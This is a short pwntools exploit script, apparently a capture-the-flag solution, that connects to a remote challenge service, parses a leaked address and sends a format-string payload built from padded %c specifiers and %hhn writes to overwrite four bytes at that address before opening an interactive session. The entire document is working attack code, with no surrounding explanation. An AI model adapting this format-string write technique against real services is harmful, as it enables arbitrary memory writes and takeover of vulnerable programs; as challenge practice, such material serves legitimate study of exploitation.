from pwn import *

context.arch = 'amd64'
# if args.REMOTE:
p = remote('lmao.lol', 4003)
# else:
#     context.terminal = ['tmux', 'splitw', '-h']
#     p = gdb.debug('./meme',
#                   gdbscript='''
#                   b *0x401310
#                   c
#                   ''')

p.recvuntil(b'A landslide has blocked the way at ').decode('utf-8').strip()
rdn_addr_str = p.recvline().strip(b'\n')
print('rdn_addr_str', rdn_addr_str)
rdn_addr = int(rdn_addr_str, 16)

target_address = rdn_addr

payload = (b"%46c....")    #8th
payload += (b"%16$hhn.")

payload += (b"%61c....")  # t = 116 - 50 =
payload += (b"%17$hhn.")

payload += (b"%218c...")  # R = 82 - 116 + 256 =222 - 4
payload += (b"%18$hhn.")

payload += (b"%18c....")  # i = 105 - 82
payload += (b"%19$hhn.")

payload += p64(target_address)
payload += p64(target_address + 1)
payload += p64(target_address + 2)
payload += p64(target_address + 3)


p.recvuntil(b'Speak the phrase `2tRiViAl` and I shall open:').decode('utf-8').strip()
p.sendline(payload)

p.interactive()
